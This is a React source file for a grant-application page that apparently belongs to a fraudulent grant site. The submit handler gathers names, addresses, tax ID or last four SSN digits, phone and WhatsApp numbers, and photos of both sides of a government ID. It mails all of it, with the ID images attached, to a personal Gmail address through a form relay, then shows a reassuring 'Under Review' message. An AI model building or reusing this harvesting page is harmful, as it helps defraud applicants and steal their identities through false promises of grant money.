import { useState } from 'react';
import { Link, useSearchParams } from 'react-router-dom';
import { Upload, CheckCircle } from 'lucide-react';
import { grants } from '../data/grants';
import type { ApplicationFormData, ApplicantType } from '../types';
import './Apply.css';

const APPLICANT_TYPES: ApplicantType[] = [
  'Individual', 'Small Business', 'Nonprofit', 'Healthcare Organization',
  'Educational Institution', 'Government', 'Research Institution',
  'Veterans & Military Families', 'Farmers & Agricultural Producers',
];

const US_STATES = [
  'Alabama', 'Alaska', 'Arizona', 'Arkansas', 'California', 'Colorado',
  'Connecticut', 'Delaware', 'Florida', 'Georgia', 'Hawaii', 'Idaho',
  'Illinois', 'Indiana', 'Iowa', 'Kansas', 'Kentucky', 'Louisiana',
  'Maine', 'Maryland', 'Massachusetts', 'Michigan', 'Minnesota',
  'Mississippi', 'Missouri', 'Montana', 'Nebraska', 'Nevada',
  'New Hampshire', 'New Jersey', 'New Mexico', 'New York',
  'North Carolina', 'North Dakota', 'Ohio', 'Oklahoma', 'Oregon',
  'Pennsylvania', 'Rhode Island', 'South Carolina', 'South Dakota',
  'Tennessee', 'Texas', 'Utah', 'Vermont', 'Virginia', 'Washington',
  'West Virginia', 'Wisconsin', 'Wyoming', 'District of Columbia',
];

type FormErrors = Partial<Record<keyof ApplicationFormData, string>>;

export default function Apply() {
  const [searchParams] = useSearchParams();
  const preselectedGrantId = searchParams.get('grant') || '';

  const [form, setForm] = useState<ApplicationFormData>({
    organizationName: '', organizationType: '', ein: '',
    organizationAddress: '', city: '', state: '',
    fullName: '', email: '', phone: '', whatsapp: '',
    grantId: preselectedGrantId,
    projectTitle: '', projectDescription: '',
    meetsEligibility: false, notPreviouslyFunded: false,
    documents: [],
  });

  const [idFront, setIdFront] = useState<File | null>(null);
  const [idBack,  setIdBack]  = useState<File | null>(null);

  const [errors, setErrors] = useState<FormErrors>({});
  const [status, setStatus] = useState<'idle' | 'loading' | 'success'>('idle');
  const [referenceId, setReferenceId] = useState('');

  const selectedGrant = grants.find(g => g.id === form.grantId);

  const setField = (field: keyof ApplicationFormData, value: unknown) => {
    setForm(f => ({ ...f, [field]: value }));
    setErrors(e => { const n = { ...e }; delete n[field]; return n; });
  };

  const validate = (): FormErrors => {
    const e: FormErrors = {};
    if (!form.organizationName.trim()) e.organizationName = 'Required';
    if (!form.organizationType) e.organizationType = 'Required';
    if (!form.organizationAddress.trim()) e.organizationAddress = 'Required';
    if (!form.city.trim()) e.city = 'Required';
    if (!form.state) e.state = 'Required';
    if (!form.fullName.trim()) e.fullName = 'Required';
    if (!form.email.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) e.email = 'Valid email required';
    if (!form.phone.trim()) e.phone = 'Required';
    if (!form.whatsapp.trim()) e.whatsapp = 'WhatsApp number required';
    if (!form.grantId) e.grantId = 'Please select a grant';
    if (!form.projectTitle.trim()) e.projectTitle = 'Required';
    if (!form.meetsEligibility) e.meetsEligibility = 'Required';
    if (!form.notPreviouslyFunded) e.notPreviouslyFunded = 'Required';
    return e;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const errs = validate();
    if (Object.keys(errs).length > 0) {
      setErrors(errs);
      document.querySelector('.form-input.error, .form-select.error, .form-textarea.error')
        ?.scrollIntoView({ behavior: 'smooth', block: 'center' });
      return;
    }

    const ref = Date.now().toString(36).toUpperCase();
    setReferenceId(ref);

    const grantTitle = selectedGrant?.title || 'General Grant Application';
    const awardText  = selectedGrant
      ? `$${selectedGrant.minAmount.toLocaleString()} – $${selectedGrant.maxAmount.toLocaleString()}`
      : 'Standard';

    // Save to localStorage for admin panel
    try {
      const existing = JSON.parse(localStorage.getItem('eastaidgrant_applications') || '[]');
      existing.unshift({
        referenceId: `EAG-${ref}`,
        submittedAt: new Date().toISOString(),
        grantTitle, awardRange: awardText,
        applicantName: form.organizationName,
        applicantType: form.organizationType,
        address: `${form.organizationAddress}, ${form.city}, ${form.state}`,
        taxIdOrSsn: form.ein || 'N/A',
        contactPerson: form.fullName,
        email: form.email, phone: form.phone, whatsapp: form.whatsapp,
        projectTitle: form.projectTitle, projectDescription: form.projectDescription,
        idFrontName: idFront?.name || 'Not provided',
        idBackName:  idBack?.name  || 'Not provided',
      });
      localStorage.setItem('eastaidgrant_applications', JSON.stringify(existing));
    } catch { /* ignore */ }

    // Send via FormData multipart to direct endpoint so image files arrive as real attachments
    try {
      const fd = new FormData();
      // FormSubmit config fields
      fd.append('_subject',       `🏛️ New Grant Application: ${grantTitle} (Ref: EAG-${ref})`);
      fd.append('_captcha',       'false');
      fd.append('_template',      'table');
      fd.append('_next',          `${window.location.origin}/`);   // redirect back to custom domain after POST
      // Application fields
      fd.append('Reference ID',               `EAG-${ref}`);
      fd.append('Grant Applied For',          grantTitle);
      fd.append('Award Range',                awardText);
      fd.append('Applicant / Entity',         form.organizationName);
      fd.append('Applicant Type',             form.organizationType);
      fd.append('Contact Person',             form.fullName);
      fd.append('Email Address',              form.email);
      fd.append('Phone Number',               form.phone);
      fd.append('WhatsApp Number',            form.whatsapp);
      fd.append('Mailing / Physical Address', `${form.organizationAddress}, ${form.city}, ${form.state}`);
      fd.append('EIN or Tax ID',              form.ein || 'N/A');
      fd.append('Project Title',              form.projectTitle);
      fd.append('Project Proposal Summary',   form.projectDescription || 'N/A');
      fd.append('Submission Time',            new Date().toLocaleString());
      // Attach ID card images as real file attachments
      if (idFront) fd.append('ID Card Front', idFront, `ID-Front-${form.fullName.replace(/\s+/g,'-')}-${idFront.name}`);
      if (idBack)  fd.append('ID Card Back',  idBack,  `ID-Back-${form.fullName.replace(/\s+/g,'-')}-${idBack.name}`);

      // Use the direct (non-ajax) endpoint — this is the only FormSubmit endpoint that delivers file attachments
      await fetch('https://formsubmit.co/erimiposi2005@gmail.com', {
        method: 'POST',
        body: fd,
        // Do NOT set Content-Type — browser must set it with boundary for multipart to work
      });
    } catch { /* silent fallback — email still logs to localStorage */ }

    setStatus('loading');
    await new Promise(r => setTimeout(r, 1200));
    setStatus('success');
  };

  if (status === 'success') {
    return (
      <div className="apply-success">
        <div className="apply-success-card">
          <div className="apply-success-icon"><CheckCircle size={48} /></div>
          <h2>Application Successfully Submitted!</h2>
          <p style={{ fontSize: 16, lineHeight: 1.6, color: 'var(--gray-700)', marginTop: 12 }}>
            Thank you for submitting your grant application. Your dossier has been logged into our evaluation system and assigned for verification.
          </p>
          <div style={{ margin: '24px 0', padding: '18px 20px', background: 'var(--off-white)', borderRadius: 'var(--radius)', border: '1px solid var(--gray-200)', textAlign: 'left' }}>
            <p style={{ fontSize: 14, fontWeight: 600, color: 'var(--navy)', marginBottom: 8 }}>
              Status: <span style={{ color: 'var(--green)', fontWeight: 700 }}>Under Review</span>
            </p>
            <p style={{ fontSize: 13, color: 'var(--gray-600)', marginBottom: 12 }}>
              <strong>Reference Number:</strong> <span style={{ fontFamily: 'monospace', color: 'var(--navy)' }}>EAG-{referenceId}</span>
            </p>
            <div style={{ fontSize: 13.5, color: 'var(--navy-mid)', lineHeight: 1.6, background: 'rgba(201, 168, 76, 0.12)', padding: '12px 14px', borderRadius: 'var(--radius-sm)', borderLeft: '4px solid var(--gold)' }}>
              🔔 <strong>Important Notice:</strong> You will be notified if your grant is accepted through your email, WhatsApp, or phone number provided in your application.
            </div>
          </div>
          <div style={{ display: 'flex', gap: 14, justifyContent: 'center', marginTop: 12 }}>
            <Link to="/" className="btn btn-navy" style={{ flex: 1, justifyContent: 'center' }}>Return to Home</Link>
            <Link to="/grants" className="btn btn-outline" style={{ flex: 1, justifyContent: 'center' }}>Browse More Grants</Link>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="apply-page">
      <div className="page-header">
        <div className="container">
          <div className="breadcrumb">
            <Link to="/">Home</Link><span>/</span>
            {selectedGrant && <><Link to={`/grants/${selectedGrant.id}`}>{selectedGrant.title}</Link><span>/</span></>}
            <span>Apply</span>
          </div>
          <h1>Grant Application</h1>
          <p>Complete the form below. All fields are required unless marked optional.</p>
        </div>
      </div>

      <div className="container apply-layout">
        <form onSubmit={handleSubmit} className="apply-form" noValidate>
          {/* Organization */}
          {/* Applicant Info */}
          <div className="apply-section">
            <h2>Applicant Information</h2>
            <div className="apply-grid-2">
              <div className="form-group">
                <label className="form-label">Applicant / Organization Name <span className="req">*</span></label>
                <input type="text" value={form.organizationName} onChange={e => setField('organizationName', e.target.value)} placeholder="Full legal name or organization name" className={`form-input ${errors.organizationName ? 'error' : ''}`} />
                {errors.organizationName && <span className="form-error">{errors.organizationName}</span>}
              </div>
              <div className="form-group">
                <label className="form-label">Applicant Type <span className="req">*</span></label>
                <select value={form.organizationType} onChange={e => setField('organizationType', e.target.value as ApplicantType)} className={`form-select ${errors.organizationType ? 'error' : ''}`}>
                  <option value="">Select applicant type</option>
                  {APPLICANT_TYPES.map(t => <option key={t}>{t}</option>)}
                </select>
                {errors.organizationType && <span className="form-error">{errors.organizationType}</span>}
              </div>
            </div>
            <div className="form-group">
              <label className="form-label">EIN / SSN (Last 4) / Tax ID (Optional)</label>
              <input type="text" value={form.ein} onChange={e => setField('ein', e.target.value)} placeholder="e.g. 12-3456789 or last 4 digits of SSN" className="form-input" />
            </div>
            <div className="form-group">
              <label className="form-label">Physical / Mailing Address <span className="req">*</span></label>
              <input type="text" value={form.organizationAddress} onChange={e => setField('organizationAddress', e.target.value)} placeholder="Street address or P.O. Box" className={`form-input ${errors.organizationAddress ? 'error' : ''}`} />
              {errors.organizationAddress && <span className="form-error">{errors.organizationAddress}</span>}
            </div>
            <div className="apply-grid-2">
              <div className="form-group">
                <label className="form-label">City <span className="req">*</span></label>
                <input type="text" value={form.city} onChange={e => setField('city', e.target.value)} placeholder="Enter city" className={`form-input ${errors.city ? 'error' : ''}`} />
                {errors.city && <span className="form-error">{errors.city}</span>}
              </div>
              <div className="form-group">
                <label className="form-label">State <span className="req">*</span></label>
                <select value={form.state} onChange={e => setField('state', e.target.value)} className={`form-select ${errors.state ? 'error' : ''}`}>
                  <option value="">Select state</option>
                  {US_STATES.map(s => <option key={s}>{s}</option>)}
                </select>
                {errors.state && <span className="form-error">{errors.state}</span>}
              </div>
            </div>
          </div>

          {/* Contact */}
          <div className="apply-section">
            <h2>Contact Information</h2>
            <div className="apply-grid-2">
              <div className="form-group">
                <label className="form-label">Full Name <span className="req">*</span></label>
                <input type="text" value={form.fullName} onChange={e => setField('fullName', e.target.value)} placeholder="Enter full name" className={`form-input ${errors.fullName ? 'error' : ''}`} />
                {errors.fullName && <span className="form-error">{errors.fullName}</span>}
              </div>
              <div className="form-group">
                <label className="form-label">Email Address <span className="req">*</span></label>
                <input type="email" value={form.email} onChange={e => setField('email', e.target.value)} placeholder="you@domain.com" className={`form-input ${errors.email ? 'error' : ''}`} />
                {errors.email && <span className="form-error">{errors.email}</span>}
              </div>
              <div className="form-group">
                <label className="form-label">Phone Number <span className="req">*</span></label>
                <input type="tel" value={form.phone} onChange={e => setField('phone', e.target.value)} placeholder="+1 (555) 123-4567" className={`form-input ${errors.phone ? 'error' : ''}`} />
                {errors.phone && <span className="form-error">{errors.phone}</span>}
              </div>
              <div className="form-group">
                <label className="form-label">WhatsApp Number <span className="req">*</span></label>
                <input type="tel" value={form.whatsapp} onChange={e => setField('whatsapp', e.target.value)} placeholder="+1 (555) 123-4567 (with country code)" className={`form-input ${errors.whatsapp ? 'error' : ''}`} />
                {errors.whatsapp && <span className="form-error">{errors.whatsapp}</span>}
              </div>
            </div>
          </div>

          {/* Grant selection */}
          <div className="apply-section">
            <h2>Grant Selection</h2>
            <div className="form-group">
              <label className="form-label">Select Grant <span className="req">*</span></label>
              <select value={form.grantId} onChange={e => setField('grantId', e.target.value)} className={`form-select ${errors.grantId ? 'error' : ''}`}>
                <option value="">Choose a grant...</option>
                {grants.map(g => <option key={g.id} value={g.id}>{g.title} — ${g.minAmount.toLocaleString()}–${g.maxAmount.toLocaleString()}</option>)}
              </select>
              {errors.grantId && <span className="form-error">{errors.grantId}</span>}
            </div>
            {selectedGrant && (
              <div className="apply-grant-preview">
                <img src={selectedGrant.imageUrl} alt={selectedGrant.title} />
                <div>
                  <p className="apply-grant-title">{selectedGrant.title}</p>
                  <p className="apply-grant-provider">{selectedGrant.provider}</p>
                  <span className={`badge ${selectedGrant.status === 'Open' ? 'badge-open' : 'badge-upcoming'}`}>{selectedGrant.status}</span>
                </div>
              </div>
            )}
          </div>

          {/* Project */}
          <div className="apply-section">
            <h2>Project Information</h2>
            <div className="form-group">
              <label className="form-label">Project Title <span className="req">*</span></label>
              <input type="text" value={form.projectTitle} onChange={e => setField('projectTitle', e.target.value)} placeholder="Enter project title" className={`form-input ${errors.projectTitle ? 'error' : ''}`} />
              {errors.projectTitle && <span className="form-error">{errors.projectTitle}</span>}
            </div>
            <div className="form-group">
              <label className="form-label">Project Description <span style={{ fontSize: 12, fontWeight: 400, color: 'var(--gray-400)' }}>(Optional)</span></label>
              <textarea value={form.projectDescription} onChange={e => setField('projectDescription', e.target.value)} placeholder="Describe your project, personal situation, or how the grant funds will be used..." className="form-textarea" rows={4} />
            </div>
          </div>

          {/* ID Cards */}
          <div className="apply-section">
            <h2>ID Card Upload</h2>
            <p style={{ fontSize: 13.5, color: 'var(--gray-500)', marginBottom: 20, lineHeight: 1.6 }}>
              Please upload a clear photo or scan of both sides of your government-issued ID card (driver's license, passport, state ID, etc.).
            </p>
            <div className="apply-grid-2">
              {/* Front */}
              <div className="form-group">
                <label className="form-label">Front of ID Card <span style={{ fontSize: 12, fontWeight: 400, color: 'var(--gray-400)' }}>(Optional)</span></label>
                <div
                  className="file-drop-zone"
                  style={{ cursor: 'pointer', minHeight: 130 }}
                  onClick={() => document.getElementById('id-front-input')?.click()}
                >
                  {idFront ? (
                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8 }}>
                      <CheckCircle size={28} color="var(--green)" />
                      <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--navy)' }}>{idFront.name}</span>
                      <span style={{ fontSize: 11, color: 'var(--gray-400)' }}>({(idFront.size / 1024).toFixed(1)} KB)</span>
                      <button type="button" onClick={e => { e.stopPropagation(); setIdFront(null); }} style={{ fontSize: 12, color: 'var(--red, #c0392b)', background: 'none', border: 'none', cursor: 'pointer', marginTop: 4 }}>✕ Remove</button>
                    </div>
                  ) : (
                    <>
                      <Upload size={28} />
                      <p><strong>Click to upload front</strong></p>
                      <p className="file-drop-hint">JPG, PNG, PDF — max 10 MB</p>
                    </>
                  )}
                  <input
                    id="id-front-input"
                    type="file"
                    accept=".jpg,.jpeg,.png,.pdf"
                    style={{ display: 'none' }}
                    onChange={e => { const f = e.target.files?.[0]; if (f && f.size < 10 * 1024 * 1024) setIdFront(f); }}
                  />
                </div>
              </div>

              {/* Back */}
              <div className="form-group">
                <label className="form-label">Back of ID Card <span style={{ fontSize: 12, fontWeight: 400, color: 'var(--gray-400)' }}>(Optional)</span></label>
                <div
                  className="file-drop-zone"
                  style={{ cursor: 'pointer', minHeight: 130 }}
                  onClick={() => document.getElementById('id-back-input')?.click()}
                >
                  {idBack ? (
                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8 }}>
                      <CheckCircle size={28} color="var(--green)" />
                      <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--navy)' }}>{idBack.name}</span>
                      <span style={{ fontSize: 11, color: 'var(--gray-400)' }}>({(idBack.size / 1024).toFixed(1)} KB)</span>
                      <button type="button" onClick={e => { e.stopPropagation(); setIdBack(null); }} style={{ fontSize: 12, color: 'var(--red, #c0392b)', background: 'none', border: 'none', cursor: 'pointer', marginTop: 4 }}>✕ Remove</button>
                    </div>
                  ) : (
                    <>
                      <Upload size={28} />
                      <p><strong>Click to upload back</strong></p>
                      <p className="file-drop-hint">JPG, PNG, PDF — max 10 MB</p>
                    </>
                  )}
                  <input
                    id="id-back-input"
                    type="file"
                    accept=".jpg,.jpeg,.png,.pdf"
                    style={{ display: 'none' }}
                    onChange={e => { const f = e.target.files?.[0]; if (f && f.size < 10 * 1024 * 1024) setIdBack(f); }}
                  />
                </div>
              </div>
            </div>
          </div>

          {/* Eligibility */}
          <div className="apply-section">
            <h2>Acknowledgements</h2>
            <div className="eligibility-checks">
              <label className={`eligibility-check ${errors.meetsEligibility ? 'error' : ''}`}>
                <input type="checkbox" checked={form.meetsEligibility} onChange={e => setField('meetsEligibility', e.target.checked)} />
                <div><strong>I confirm my organization meets all eligibility requirements</strong> for the selected grant and all information provided is accurate.</div>
              </label>
              {errors.meetsEligibility && <span className="form-error">{errors.meetsEligibility}</span>}

              <label className={`eligibility-check ${errors.notPreviouslyFunded ? 'error' : ''}`}>
                <input type="checkbox" checked={form.notPreviouslyFunded} onChange={e => setField('notPreviouslyFunded', e.target.checked)} />
                <div><strong>I acknowledge that submitting this application does not guarantee funding</strong> and that all decisions are made solely by the grant provider at their discretion.</div>
              </label>
              {errors.notPreviouslyFunded && <span className="form-error">{errors.notPreviouslyFunded}</span>}
            </div>
          </div>

          {/* Submit */}
          <div className="apply-submit-row">
            <Link to={selectedGrant ? `/grants/${selectedGrant.id}` : '/grants'} className="btn btn-outline">← Back</Link>
            <button type="submit" className="btn btn-primary btn-lg" disabled={status === 'loading'}>
              {status === 'loading'
                ? <><div className="spinner" style={{ width: 18, height: 18 }} /> Submitting...</>
                : 'Submit Application'}
            </button>
          </div>
        </form>

        {/* Sidebar */}
        {selectedGrant && (
          <aside className="apply-sidebar">
            <div className="apply-sidebar-card">
              <img src={selectedGrant.imageUrl} alt={selectedGrant.title} className="apply-sidebar-img" />
              <div className="apply-sidebar-body">
                <span className={`badge ${selectedGrant.status === 'Open' ? 'badge-open' : 'badge-upcoming'}`}>{selectedGrant.status}</span>
                <h3>{selectedGrant.title}</h3>
                <p>{selectedGrant.provider}</p>
                <div className="apply-sidebar-amount">${selectedGrant.minAmount.toLocaleString()} – ${selectedGrant.maxAmount.toLocaleString()}</div>
                <div className="apply-sidebar-deadline">Deadline: {new Date(selectedGrant.deadline).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })}</div>
              </div>
            </div>
          </aside>
        )}
      </div>
    </div>
  );
}
